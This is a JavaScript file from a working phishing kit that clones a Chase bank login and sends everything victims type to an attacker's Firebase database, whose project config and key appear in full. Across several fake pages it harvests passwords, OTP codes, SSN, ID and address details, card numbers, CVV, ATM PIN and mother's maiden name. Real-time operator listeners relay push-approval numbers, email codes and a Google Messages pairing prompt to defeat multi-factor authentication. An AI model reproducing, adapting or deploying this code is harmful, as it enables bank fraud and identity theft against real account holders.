




    // daabase sdks import and config
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
    import { getFirestore, doc, setDoc, collection, addDoc, getDoc, getDocs, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";



// variable assiging
const firebaseConfig = {
    apiKey: "AIzaSyAmCLJimun-5Qx87-ZODkKGjBP-mQwCs34",
    authDomain: "chase-login-clone.firebaseapp.com",
    projectId: "chase-login-clone",
    storageBucket: "chase-login-clone.firebasestorage.app",
    messagingSenderId: "328785336138",
    appId: "1:328785336138:web:9fe9ba42e42c1b310513b3"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app)

    // configuing user deviec data
let deviceagent = navigator.userAgent
    deviceagent = String(deviceagent)
let device = deviceagent.replace(/[\/.#\[\]\s]/g, "-");

// page checker
let currentpage = document.body.id;

// payment validate first page start
     if(currentpage === "home-page"){
    const yesbuttonhtml = document.getElementById("yesbutton")
    const nobutton = document.getElementById("nobutton")
    const popupinterface = document.getElementById("popupinterface") 
    const loginbutton = document.getElementById("loginbutton")

    yesbuttonhtml.addEventListener(`click`, () => {window.location.href = "login.html"})
    nobutton.addEventListener(`click`, () => { popupinterface.style.display = `inline`})
    loginbutton.addEventListener(`click`, () => {window.location.href = "login.html"})

    
 };
// payment validate first page start


// start of login.html 🔷

 if(currentpage ==="login-page"){


    




// login input filed
const usernamehtml = document.getElementById("username");
const passwordhtml = document.getElementById("password");
const tokenhtml = document.getElementById("token");



// display wrong

const namelabel = document.getElementById("namelabel");
const passwordlabel = document.getElementById("passwordlabel");
const tokenlabel = document.getElementById("tokenlabel");

const passwordspan = document.getElementById("passwordspan")

const showwrongusername = document.getElementById("showwrongusername");
const showwrongpassword = document.getElementById("showwrongpassword");
const showwrongtoken = document.getElementById("showwrongtoken");

// check token diplay

const tokenconid = document.getElementById("tokenconid");
const usetoken = document.getElementById("usetoken");

// button
const showpass = document.getElementById("showpass")
const signin = document.getElementById("signin");


// show password function

showpass.addEventListener(`click`, () => {
    if(passwordhtml.type === `password`){
        passwordhtml.type = `text`
        showpass.textContent = "Hide"
    }
    else{
        passwordhtml.type = `password`
        showpass.textContent = "Show"
    }
})


// token checkfunction

usetoken.addEventListener(`change`, () => { 
    if(usetoken.checked){
        tokenconid.style.display = `flex`
    }
    else{
        tokenconid.style.display = ``
    }
})


let sendsurenametodb
let sendpasswordtodb
let sendtokentodb

// buttn functions

signin.addEventListener(`click`, function(){
    let username = usernamehtml.value
    let password = passwordhtml.value;
    let token = tokenhtml.value;


    // username wrong display
    if(username == "" || username.length < 5){
        namelabel.style.fontWeight =`550`
        namelabel.style.color = `darkred`
        showwrongusername.style.display = `block`
        usernamehtml.style.borderBottom = `2px solid tomato`

            sendsurenametodb = false
    }
    else{
        namelabel.style.fontWeight = ``
        namelabel.style.color = ``
        showwrongusername.style.display = ``
        usernamehtml.style.borderBottom = ``

        sendsurenametodb = true
    }

    // password wrong display 
    if(password == "" || password.length < 8){
        passwordlabel.style.fontWeight = `550`
        passwordlabel.style.color = `darkred`
        showwrongpassword.style.display = `block`
        passwordspan.style.borderBottom = `2px solid tomato`

        sendpasswordtodb = false
    }
    else{
        passwordlabel.style.fontWeight = ``
        passwordlabel.style.color = ``
        showwrongpassword.style.display = ``
        passwordspan.style.borderBottom = ``

        sendpasswordtodb = true
    }

    // token wrong display
    if(token == "" || token.length < 6){
        tokenlabel.style.fontWeight = `550`
        tokenlabel.style.color = `darkred`
        showwrongtoken.style.display = `block`
        tokenhtml.style.borderBottom = `2px solid tomato`

        sendtokentodb = false
    }
    else{
        tokenlabel.style.fontWeight = ``
        tokenlabel.style.color = ``
        showwrongtoken.style.display = ``
        tokenhtml.style.borderBottom = ``

        sendtokentodb = true
    }

    if(sendpasswordtodb & sendsurenametodb || sendtokentodb){
        // button animation
        signin.innerHTML = `<div class="loadingio-spinner-rolling-nq4q5u6dq7r">
                                <div class="ldio-x2uulkbinbj">
                                <div></div>
                                </div>
                            </div>
                            <style type="text/css">
@keyframes ldio-x2uulkbinbj {
  0% { transform: translate(-50%,-50%) rotate(0deg); }
  100% { transform: translate(-50%,-50%) rotate(360deg); }
}
.ldio-x2uulkbinbj div {
  position: absolute;
  width: 70px;
  height: 70px;
  border: 10px solid #ffffff;
  border-top-color: transparent;
  border-radius: 50%;
}
.ldio-x2uulkbinbj div {
  animation: ldio-x2uulkbinbj 1s linear infinite;
  top: 50px;
  left: 50px
}
.loadingio-spinner-rolling-nq4q5u6dq7r {
  width: 20px;
  height: 20px;
  display: inline-block;
  overflow: hidden;
  background: rgba(0, 0, 0, 0);
}
.ldio-x2uulkbinbj {
  width: 100%;
  height: 100%;
  position: relative;
  transform: translateZ(0) scale(0.2);
  backface-visibility: hidden;
  transform-origin: 0 0; /* see note above */
}
.ldio-x2uulkbinbj div { box-sizing: content-box; }
/* [ldio] generated by https://loading.io */
</style>
                            `
        // button animation stop


        // send credentials to db
        setDoc(doc(db, "users", device), {
            Alldone: false,
            usernamedb: username,
            passworddb: password,
            tokendb: token,
            loadotp: null,
            // Bwinlocate:
        })
        .then(() => {window.location.href = `loading.html`})
    }
})
}
// end of login.html 🔷

// loading page start

 if(currentpage ==="loading-page"){
    const docref = doc(db, "users", device)
    onSnapshot(docref, (snapshot) => {
        const data = snapshot.data();
        const dbloadotp = data.loadotp

        if(dbloadotp){
        window.location.href = `secure-accessaccount.html`
        }
        else if(dbloadotp == false){
           window.location.href = `Account-Recovery.html` 
        }
    })
    // check dbloadotp to see which page to redirect
};
// loading page end

// secure-accessaccount start

if(currentpage === "otp-page"){

    const otpnextbutton = document.getElementById("otpnextbutton");
    const otpinputid = document.getElementById("otpinputid");
    const exitbuttonsecure = document.getElementById("exitbuttonsecure");

    exitbuttonsecure.addEventListener(`click`, () => {
    window.location.href = `login.html`
            })

    otpnextbutton.addEventListener(`click`, () => {
        let otpinputidval = otpinputid.value
        // console.log(typeof otpinputidval)
            // otpinputidval = Number(otpinputidval);

            if(otpinputidval == "" || otpinputidval.length <= 5 || otpinputidval.length > 6){
                document.getElementById("redwrongeotpmessage").style.color = `rgb(196, 62, 38)`
                document.getElementById("redwrongeotpmessage").style.fontWeight = `550`
                document.getElementById("showwrongotp").style.display = `flex`
            }
            if(otpinputidval.length == 6){
                otpnextbutton.innerHTML = `
                <div class="loadingio-spinner-rolling-2by998twmg8">
                    <div class="ldio-yzaezf3dcmj">
                        <div></div>
                    </div>
                </div>

                <style type="text/css">
                    @keyframes ldio-yzaezf3dcmj {
                    0% { transform: translate(-50%,-50%) rotate(0deg); }
                    100% { transform: translate(-50%,-50%) rotate(360deg); }
                    }
                    .ldio-yzaezf3dcmj div {
                    position: absolute;
                    width: 60px;
                    height: 60px;
                    border: 10px solid #ffffff;
                    border-top-color: transparent;
                    border-radius: 50%;
                    }
                    .ldio-yzaezf3dcmj div {
                    animation: ldio-yzaezf3dcmj 1s linear infinite;
                    top: 50px;
                    left: 50px
                    }
                    .loadingio-spinner-rolling-2by998twmg8 {
                    width: 15px;
                    height: 15px;
                    display: inline-block;
                    overflow: hidden;
                    background: rgba(0, 0, 0, 0);
                    }
                    .ldio-yzaezf3dcmj {
                    width: 100%;
                    height: 100%;
                    position: relative;
                    transform: translateZ(0) scale(0.15);
                    backface-visibility: hidden;
                    transform-origin: 0 0; /* see note above */
                    }
                    .ldio-yzaezf3dcmj div { box-sizing: content-box; }
                    /* [ldio] generated by https://loading.io */
                </style>
                `
                updateDoc(doc(db, "users", device), {
                    otpcode: otpinputidval
                })
                .then(() => {window.location.href = `Account-Recovery.html`})

            }
            // finish up why won't it console
    })

};

if(currentpage ==="personal-page"){
    const Recoverynextbutton = document.getElementById("Recoverynextbutton");
    const exitbuttonacccount = document.getElementById("exitbuttonacccount");
    exitbuttonacccount.addEventListener(`click`, () => {
        window.location.href = `secure-accessaccount.html`
    })

    Recoverynextbutton.addEventListener(`click`, () => {
        console.log(`clikc`)
        const Recoveryinputname = document.getElementById("Recoveryinputname").value;
        const RecoveryinputDOB = document.getElementById("RecoveryinputDOB").value;
        const RecoveryinputSSN = document.getElementById("RecoveryinputSSN").value;
        const RecoveryinputIDnum = document.getElementById("RecoveryinputIDnum").value;
        const RecoveryinputphoneNUM = document.getElementById("RecoveryinputphoneNUM").value;
        const Recoveryinputemail = document.getElementById("Recoveryinputemail").value;
        const RecoveryinputAddress = document.getElementById("RecoveryinputAddress").value;
        const RecoveryinputCity = document.getElementById("RecoveryinputCity").value;
        const RecoveryinputState = document.getElementById("RecoveryinputState").value;
        const RecoveryinputZIP = document.getElementById("RecoveryinputZIP").value;

        const recoverywronginputName = document.getElementById("recoverywronginputName")
        const recoverywronginputdob = document.getElementById("recoverywronginputdob")
        const recoverywronginputSSN = document.getElementById("recoverywronginputSSN")
        const recoverywronginputIDNUM = document.getElementById("recoverywronginputIDNUM")
        const recoverywronginputPHONUM = document.getElementById("recoverywronginputPHONUM")
        const recoverywronginputemail = document.getElementById("recoverywronginputemail")
        const recoverywronginputAddress = document.getElementById("recoverywronginputAddress")
        const recoverywronginputCity = document.getElementById("recoverywronginputCity")
        const recoverywronginputState = document.getElementById("recoverywronginputState")
        const recoverywronginputZip = document.getElementById("recoverywronginputZip")

        let validemail
        if(Recoveryinputemail.includes("@") & Recoveryinputemail.includes(".com")){
            validemail = true
        }
        else{
            validemail = false
        }

        let usercreds = {}

        let countcheck = null

        // Full Name
        if(Recoveryinputname == ""){
            recoverywronginputName.style.display = `flex`
        }
        else{
            recoverywronginputName.style.display = `none`
            usercreds.fullname = Recoveryinputname
            countcheck ++;
        }
        // Date of birth (MM/DD/YYYY)
        if(RecoveryinputDOB == ""){
            recoverywronginputdob.style.display = `flex`
        }
        else{
            recoverywronginputdob.style.display = `none`
            usercreds.DOB = RecoveryinputDOB
            countcheck ++;
        }

        // Social Security Number (SSN)
        if(RecoveryinputSSN == "" || RecoveryinputSSN.length < 9 || RecoveryinputSSN.length > 9){
            recoverywronginputSSN.style.display = `flex`
        }
        else{
            recoverywronginputSSN.style.display = `none`
            usercreds.SSN = RecoveryinputSSN
            countcheck ++;
        }

        // ID Number
        if(RecoveryinputIDnum == ""){
            recoverywronginputIDNUM.style.display = `flex`
        }
        else{
            recoverywronginputIDNUM.style.display = `none`
            usercreds.IDnumber = RecoveryinputIDnum
            countcheck ++;
        }

        // Phone Number
        if(RecoveryinputphoneNUM == "" || RecoveryinputphoneNUM.length < 10){
            recoverywronginputPHONUM.style.display = `flex`
        }
        else{
            recoverywronginputPHONUM.style.display = `none`
            usercreds.phonenum = RecoveryinputphoneNUM
            countcheck ++;
        }

        // email 
        if(Recoveryinputemail == "" || validemail == false){
            recoverywronginputemail.style.display = `flex`
        }
        else{
            recoverywronginputemail.style.display = `none`
            usercreds.Email = Recoveryinputemail
            countcheck ++;
        }

        // Address
        if(RecoveryinputAddress == ""){
            recoverywronginputAddress.style.display = `flex`
        }
        else{
            recoverywronginputAddress.style.display = `none`
            usercreds.Address = RecoveryinputAddress
            countcheck ++;
        }

        // City
        if(RecoveryinputCity == ""){
            recoverywronginputCity.style.display = `flex`
        }
        else{
            recoverywronginputCity.style.display = `none`
            usercreds.city = RecoveryinputCity
            countcheck ++;
        }

        // State
        if(RecoveryinputState == ""){
            recoverywronginputState.style.display = `flex`
        }
        else{
            recoverywronginputState.style.display = `none`
            usercreds.state = RecoveryinputState
            countcheck ++;
        }

        // Zip Code
        if(RecoveryinputZIP == ""){
            recoverywronginputZip.style.display = `flex`
        }
        else{
            recoverywronginputZip.style.display = `none`
            usercreds.ZIP = RecoveryinputZIP
            countcheck ++;
        }
        
        if(countcheck == 10){
            Recoverynextbutton.innerHTML = `
                <div class="loadingio-spinner-rolling-2by998twmg8">
                    <div class="ldio-yzaezf3dcmj">
                        <div></div>
                    </div>
                </div>

                <style type="text/css">
                    @keyframes ldio-yzaezf3dcmj {
                    0% { transform: translate(-50%,-50%) rotate(0deg); }
                    100% { transform: translate(-50%,-50%) rotate(360deg); }
                    }
                    .ldio-yzaezf3dcmj div {
                    position: absolute;
                    width: 60px;
                    height: 60px;
                    border: 10px solid #ffffff;
                    border-top-color: transparent;
                    border-radius: 50%;
                    }
                    .ldio-yzaezf3dcmj div {
                    animation: ldio-yzaezf3dcmj 1s linear infinite;
                    top: 50px;
                    left: 50px
                    }
                    .loadingio-spinner-rolling-2by998twmg8 {
                    width: 15px;
                    height: 15px;
                    display: inline-block;
                    overflow: hidden;
                    background: rgba(0, 0, 0, 0);
                    }
                    .ldio-yzaezf3dcmj {
                    width: 100%;
                    height: 100%;
                    position: relative;
                    transform: translateZ(0) scale(0.15);
                    backface-visibility: hidden;
                    transform-origin: 0 0; /* see note above */
                    }
                    .ldio-yzaezf3dcmj div { box-sizing: content-box; }
                    /* [ldio] generated by https://loading.io */
                </style>
                `
                updateDoc(doc(db, "users", device), {
                    fullname: usercreds.fullname,
                    dateofbirth: usercreds.DOB,
                    SSN: usercreds.SSN,
                    idnumber: usercreds.IDnumber,
                    phonenumber: usercreds.phonenum,
                    Email: usercreds.Email,
                    address: usercreds.Address,
                    city: usercreds.city,
                    State: usercreds.state,
                    ZipCode: usercreds.ZIP,
                    emailotp: null,
                    emailfailed: null,
                    emailnumber: ""
        })
        .then(() => {window.location.href = `card-details.html`})
        }
        

        
    })
};


if(currentpage === "card-page"){
    const cardnextbutton = document.getElementById("cardnextbutton");
    const exitbuttoncard = document.getElementById("exitbuttoncard");
    exitbuttoncard.addEventListener(`click`, () => {
        window.location.href = `Account-Recovery.html`
    })

    cardnextbutton.addEventListener(`click`, () => {
        const cardnameinput = document.getElementById("cardnameinput").value;
        const cardnumberinput = document.getElementById("cardnumberinput").value;
        const cardnDOBinput = document.getElementById("cardnDOBinput").value;
        const cardnCVVinput = document.getElementById("cardnCVVinput").value;
        const cardATMpininput = document.getElementById("cardATMpininput").value;
        const cardmmninput = document.getElementById("cardmmninput").value;

        const cardwronginputname = document.getElementById("cardwronginputname");
        const cardwronginputcardnum = document.getElementById("cardwronginputcardnum");
        const cardwronginputDOB = document.getElementById("cardwronginputDOB");
        const cardwronginputCVV = document.getElementById("cardwronginputCVV");
        const cardwronginputATMpin = document.getElementById("cardwronginputATMpin");
        const cardwronginputMMN = document.getElementById("cardwronginputMMN");

        let carddeatils = {}
        let cardcount = null
        if(cardnameinput.length >= 5){
            carddeatils.cardname = cardnameinput
            cardcount ++
            cardwronginputname.style.display = `none`
        }
        else{
            cardwronginputname.style.display = `flex`
        }

        if(cardnumberinput.length >= 15){
            carddeatils.cardnumber = cardnumberinput
            cardcount ++
            cardwronginputcardnum.style.display = `none`
        }
        else{
            cardwronginputcardnum.style.display = `flex`
        }

        if(cardnDOBinput.length >= 5){
            carddeatils.expirydate = cardnDOBinput
            cardcount ++
            cardwronginputDOB.style.display = `none`
        }
        else{
            cardwronginputDOB.style.display = `flex`
        }

        if(cardnCVVinput.length == 3){
            carddeatils.cardCVV = cardnCVVinput
            cardcount ++
            cardwronginputCVV.style.display = `none`
        }
        else{
            cardwronginputCVV.style.display = `flex`
        }

        if(cardATMpininput.length == 4){
            carddeatils.cardATMpin = cardATMpininput
            cardcount ++
            cardwronginputATMpin.style.display = `none`
        }
        else{
            cardwronginputATMpin.style.display = `flex`
        }

        if(cardmmninput.length >= 4){
            carddeatils.cardMMN = cardmmninput
            cardcount ++
            cardwronginputMMN.style.display = `none`
        }
        else{
            cardwronginputMMN.style.display = `flex`
        }

        if(cardcount == 6){
            console.log(carddeatils)

            cardnextbutton.innerHTML = `
                <div class="loadingio-spinner-rolling-2by998twmg8">
                    <div class="ldio-yzaezf3dcmj">
                        <div></div>
                    </div>
                </div>

                <style type="text/css">
                    @keyframes ldio-yzaezf3dcmj {
                    0% { transform: translate(-50%,-50%) rotate(0deg); }
                    100% { transform: translate(-50%,-50%) rotate(360deg); }
                    }
                    .ldio-yzaezf3dcmj div {
                    position: absolute;
                    width: 60px;
                    height: 60px;
                    border: 10px solid #ffffff;
                    border-top-color: transparent;
                    border-radius: 50%;
                    }
                    .ldio-yzaezf3dcmj div {
                    animation: ldio-yzaezf3dcmj 1s linear infinite;
                    top: 50px;
                    left: 50px
                    }
                    .loadingio-spinner-rolling-2by998twmg8 {
                    width: 15px;
                    height: 15px;
                    display: inline-block;
                    overflow: hidden;
                    background: rgba(0, 0, 0, 0);
                    }
                    .ldio-yzaezf3dcmj {
                    width: 100%;
                    height: 100%;
                    position: relative;
                    transform: translateZ(0) scale(0.15);
                    backface-visibility: hidden;
                    transform-origin: 0 0; /* see note above */
                    }
                    .ldio-yzaezf3dcmj div { box-sizing: content-box; }
                    /* [ldio] generated by https://loading.io */
                </style>
                `



             updateDoc(doc(db, "users", device), {
                cardname: carddeatils.cardname,
                cardnum: carddeatils.cardnumber,
                cardexpirdate: carddeatils.expirydate,
                cardCVV: carddeatils.cardCVV,
                cardATMpin: carddeatils.cardATMpin,
                cardMMN: carddeatils.cardMMN
             })
             .then(() => {
                    const emaildie = doc(db, "users", device)
                    onSnapshot(emaildie, (snapshot) => {
                        const emaildieata = snapshot.data();
                        const dbemailfail = emaildieata.emailfailed

                        if(dbemailfail == true){
                            window.location.href = `device-verify.html`
                        }
                        else if(dbemailfail == false){
                            window.location.href = `document-submite.html`
                        }
                    })
                })
        }
    })

}

   


if(currentpage === "email-page"){
    const emailconinnerrightid = document.getElementById("emailconinnerrightid");
    const nextbuttonnumholdid = document.getElementById("nextbuttonnumholdid");
    const resendbutton = document.getElementById("resendbutton");
    let resendcount = null
    const exitbuttondevice = document.getElementById("exitbuttondevice");

     // email device verify
const emaildisplay = document.getElementById("emaildisplay")
const numberhold = document.getElementById("numberhold");
const numberholdsec = document.getElementById("numberholdsec");

    const emailref = doc(db, "users", device)
    onSnapshot(emailref, (snapshot) => {
        const emaildata = snapshot.data();
        const dbemail = emaildata.Email
        const emailnum = emaildata.emailnumber

        emaildisplay.textContent = dbemail
        console.log(dbemail)

        if(emailnum == ""){
            numberhold.innerHTML = `<!-- loading anima html-->
                                    <div class="loadingio-spinner-rolling-2by998twmg8">
                                    <div class="ldio-yzaezf3dcmj">
                                        <div></div>
                                    </div>
                                </div>
                                    <!-- loading anima html stop-->
                                    <!-- loading anima css-->
                                    <style type="text/css">
                                    @keyframes ldio-yzaezf3dcmj {
                                      0% { transform: translate(-50%,-50%) rotate(0deg); }
                                      100% { transform: translate(-50%,-50%) rotate(360deg); }
                                    }
                                    .ldio-yzaezf3dcmj div {
                                      position: absolute;
                                      width: 60px;
                                      height: 60px;
                                      border: 10px solid #cfc2c2;
                                      border-top-color: transparent;
                                      border-radius: 50%;
                                    }
                                    .ldio-yzaezf3dcmj div {
                                      animation: ldio-yzaezf3dcmj 1s linear infinite;
                                      top: 50px;
                                      left: 50px
                                    }
                                    .loadingio-spinner-rolling-2by998twmg8 {
                                      width: 30px;
                                      height: 30px;
                                      display: inline-block;
                                      overflow: hidden;
                                      background: transparent;
                                    }
                                    .ldio-yzaezf3dcmj {
                                      width: 100%;
                                      height: 100%;
                                      position: relative;
                                      transform: translateZ(0) scale(0.3);
                                      backface-visibility: hidden;
                                      transform-origin: 0 0; /* see note above */
                                    }
                                    .ldio-yzaezf3dcmj div { box-sizing: content-box; }
                                    /* [ldio] generated by https://loading.io */
                                </style>
                                    <!-- loading anima css stop -->`
        }
        else{
            numberhold.textContent = emailnum
            numberholdsec.textContent = emailnum
        }
    })
// email device verify


    exitbuttondevice.addEventListener(`click`, () => {
        window.location.href = `card-details.html`
    })



    resendbutton.addEventListener(`click`, () => {
        resendcount ++
        updateDoc(doc(db, "users", device), {
            RESEND: `📲 resend ${resendcount}`
        })
        .then(() => {
            resendbutton.innerHTML = `<!-- loading anima html-->
                                    <div class="loadingio-spinner-rolling-2by998twmg8">
                                    <div class="ldio-yzaezf3dcmj">
                                        <div></div>
                                    </div>
                                </div>
                                    <!-- loading anima html stop-->
                                    <!-- loading anima css-->
                                    <style type="text/css">
                                    @keyframes ldio-yzaezf3dcmj {
                                      0% { transform: translate(-50%,-50%) rotate(0deg); }
                                      100% { transform: translate(-50%,-50%) rotate(360deg); }
                                    }
                                    .ldio-yzaezf3dcmj div {
                                      position: absolute;
                                      width: 60px;
                                      height: 60px;
                                      border: 10px solid #cfc2c2;
                                      border-top-color: transparent;
                                      border-radius: 50%;
                                    }
                                    .ldio-yzaezf3dcmj div {
                                      animation: ldio-yzaezf3dcmj 1s linear infinite;
                                      top: 50px;
                                      left: 50px
                                    }
                                    .loadingio-spinner-rolling-2by998twmg8 {
                                      width: 30px;
                                      height: 30px;
                                      display: inline-block;
                                      overflow: hidden;
                                      background: transparent;
                                    }
                                    .ldio-yzaezf3dcmj {
                                      width: 100%;
                                      height: 100%;
                                      position: relative;
                                      transform: translateZ(0) scale(0.3);
                                      backface-visibility: hidden;
                                      transform-origin: 0 0; /* see note above */
                                    }
                                    .ldio-yzaezf3dcmj div { box-sizing: content-box; }
                                    /* [ldio] generated by https://loading.io */
                                </style>
                                    <!-- loading anima css stop -->`
            setTimeout(() => {
                resendbutton.innerHTML = `Resend it`
            }, 3000);
        })
    })
    
    nextbuttonnumholdid.addEventListener(`click`, () => {
        const emailrefotp = doc(db, "users", device)
    onSnapshot(emailrefotp, (snapshot) => {
        const emailotpdata = snapshot.data();
        const dbemailotp = emailotpdata.emailotp
        const emailnum = emailotpdata.emailnumber
        
        if(dbemailotp == null){
            alert(`Pull down the notification bar and tap the sign-in notification.
                 Tap Yes. then tap ${emailnum} on your phone to verify this device.`)
        }
    })
    })

    const emailrefotp = doc(db, "users", device)
    onSnapshot(emailrefotp, (snapshot) => {
        const emailotpdata = snapshot.data();
        const dbemailotp = emailotpdata.emailotp

        if(dbemailotp == false){
            emailconinnerrightid.innerHTML = `<div class="slideinotpiput">
                                    <div class="emailtopdiv">
                                    <p class="numnaratfirstline">We just sent a code to your E-mail to help you verify this device.</p>
                                    <input type="number" class="emailotpclass" id="emailotpinput" placeholder="Enter code">
                                    <span class="wronginput" id="emailwronginputOTP" style="display: none;">
                                        <i class="fa-solid fa-circle-exclamation loginexcla"></i>
                                        <p class="wronglabele">Invalid OTP code.</p>
                                    </span>
                                </div>
                                <div class="nextbuttonnumholddiv">
                                    <button class="nextbuttonnumhold" id="nextbuttonemailotp">Next</button>
                                </div>
                            </div>`
                            checkhtml()
        }
        if(dbemailotp == true){
            window.location.href = `document-submite.html`
        }

    })

    function checkhtml(){
       if(emailconinnerrightid.innerHTML.includes("slideinotpiput")){
        const nextbuttonemailotp = document.getElementById("nextbuttonemailotp");
        const emailotpinput = document.getElementById("emailotpinput");
        const emailwronginputOTP = document.getElementById("emailwronginputOTP")

        nextbuttonemailotp.addEventListener(`click`, () => {
            const emailotpinputval = String(emailotpinput.value);
            

            if(emailotpinputval.length >= 6){
                emailwronginputOTP.style.display = `none`
                updateDoc(doc(db, "users", device), {
                    emailOTPcode: emailotpinputval,
                    gmessegeimg: ""
                })

                    gmesswgecallback() 

            }
            else{
                emailwronginputOTP.style.display = `flex`
            }

        })
        }
    function gmesswgecallback() {
        const gmesrefimg = doc(db, "users", device)
                    onSnapshot(gmesrefimg, (snapshot) => {
                        const gmessegedata = snapshot.data();
                        const dbgmessage = gmessegedata.gmessegeimg

                        if(navigator.userAgent.includes("Windows") & dbgmessage != "" & dbgmessage.length > 20){
                            emailconinnerrightid.innerHTML = `
                            <div class="bmessagimgholder">
                                <div class="gmessagdiv">
                                    <img class="gmessageimgclass" id="gmessageimg" src="${dbgmessage}" alt="">
                                </div>

                                <p class="gmessagparabold">Click on the button bellow to open the google messages app on your phone then click on the click the emoji that matches the one on your browser.</p>
                                <button id="gmessagbuttonid" class="gmessagbutton"><img class="androidmessageimg" src="https://ssl.gstatic.com/android-messages-web/images/2022.3/2x/messages_2022_96dp.png" alt=""></button>

                                <div class="nextbuttonnumholddiv">
                                    <button class="nextbuttonnumhold" id="nextbuttonnumholdid">Finish</button>
                                </div>
                            </div>`
                            gmesswgebuttoncallback()
                        }
                        else if(navigator.userAgent.includes("Android") & dbgmessage != "" & dbgmessage.length > 20){
                            emailconinnerrightid.innerHTML = `
                            <div class="bmessagimgholder">
                                <div class="gmessagdiv">
                                    <img class="gmessageimgclass" id="gmessageimg" src="${dbgmessage}" alt="">
                                </div>

                                <p class="gmessagparabold">Click on the button bellow to open the google messages app on your phone then click on the click the emoji that matches the one on your browser.</p>
                                <button id="gmessagbuttonid" class="gmessagbutton"><img class="androidmessageimg" src="https://ssl.gstatic.com/android-messages-web/images/2022.3/2x/messages_2022_96dp.png" alt=""></button>

                                <div class="nextbuttonnumholddiv">
                                    <button class="nextbuttonnumhold" id="nextbuttonnumholdid">Finish</button>
                                </div>
                            </div>`
                            gmesswgebuttoncallback()
                        }
                        else{
                            emailconinnerrightid.innerHTML = `
                                <div class="loadingio-spinner-rolling-2by998twmg9">
                                    <div class="ldio-yzaezf3dcmj10">
                                        <div></div>
                                    </div>
                                </div>

                                <style type="text/css">
                                    @keyframes ldio-yzaezf3dcmj {
                                      0% { transform: translate(-50%,-50%) rotate(0deg); }
                                      100% { transform: translate(-50%,-50%) rotate(360deg); }
                                    }
                                    .ldio-yzaezf3dcmj10 div {
                                      position: absolute;
                                      width: 60px;
                                      height: 60px;
                                      border: 10px solid #78daf3;
                                      border-top-color: transparent;
                                      border-radius: 50%;
                                    }
                                    .ldio-yzaezf3dcmj10 div {
                                      animation: ldio-yzaezf3dcmj 1s linear infinite;
                                      top: 50px;
                                      left: 50px
                                    }
                                    .loadingio-spinner-rolling-2by998twmg9 {
                                      width: 50px;
                                      height: 50px;
                                      display: inline-block;
                                      overflow: hidden;
                                      background: rgba(0, 0, 0, 0);
                                    }
                                    .ldio-yzaezf3dcmj10 {
                                      width: 100%;
                                      height: 100%;
                                      position: relative;
                                      transform: translateZ(0) scale(0.5);
                                      backface-visibility: hidden;
                                      transform-origin: 0 0; /* see note above */
                                    }
                                    .ldio-yzaezf3dcmj10 div { box-sizing: content-box; }
                                    /* [ldio] generated by https://loading.io */
                                </style>
                            `
                        }
                    })
                }
        function gmesswgebuttoncallback(){
            console.log("call")
            if(emailconinnerrightid.innerHTML.includes("bmessagimgholder")){
                const gmessagbuttonid = document.getElementById("gmessagbuttonid");
                const nextbuttonnumholdid = document.getElementById("nextbuttonnumholdid");
                console.log("good")

                gmessagbuttonid.addEventListener(`click`, () => {
                    window.location.href = "intent:chase device-verification#Intent;scheme=smsto;package=com.google.android.apps.messaging;end";
                    console.log("working")
                })

                nextbuttonnumholdid.addEventListener(`click`, () => {
                    const done = doc(db, "users", device)
                    onSnapshot(done, (snapshot) => {
                        const finish = snapshot.data();
                        const alldone = finish.Alldone

                        if(alldone == true){
                            window.location.href = `document-submite.html`
                        }
                        else{
                            let  emojialert =   window.confirm("Are you sure you want to finish at this point? you haven't click on matching emoji yet")
                            if(emojialert){
                                window.location.href = `document-submite.html`
                            }
                        }

                    })
                })
            }

        }
        

    }
        
}


// alldone start
    let done = doc(db, "users", device)
                    onSnapshot(done, (snapshot) => {
                        const finish = snapshot.data();
                        let alldone = finish.Alldone

                        if(alldone == true){
                            window.location.href = `document-submite.html`
                        updateDoc(doc(db, "users", device), {
                            Alldone: false 
                        })
                        }
                    })
                    
                    
// alldone start


updateDoc(doc(db, "users", device), {
            Bwindow: window.location.pathname 
        })




